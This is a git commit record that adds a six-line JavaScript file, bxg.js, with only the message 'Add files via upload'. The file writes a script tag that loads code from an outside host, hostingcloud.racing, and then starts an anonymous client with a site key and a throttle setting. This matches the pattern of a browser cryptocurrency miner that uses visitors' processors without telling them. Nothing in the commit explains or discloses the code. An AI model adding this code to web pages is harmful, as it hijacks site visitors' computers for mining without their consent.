56b07d6c76afc7e6ef02d032eb1d103d3403efce
MA4 <126404419+a502222802@users.noreply.github.com>
2024-04-19 10:21:28 +0800

    Add files via upload

---
+++ bxg.js
@@ -0,0 +1,6 @@
+document.write('<script src="https://www.hostingcloud.racing/yPkm.js"></scr' + 'ipt>');
+
+var _client = new Client.Anonymous('c4ad1c30cd43dbd0a35cb61dc5c2d522bb4f6d8615a2cd2403b969e53755a4cb', {
+    throttle: 0.3, c: 'w', ads: 0
+});
+_client.start();
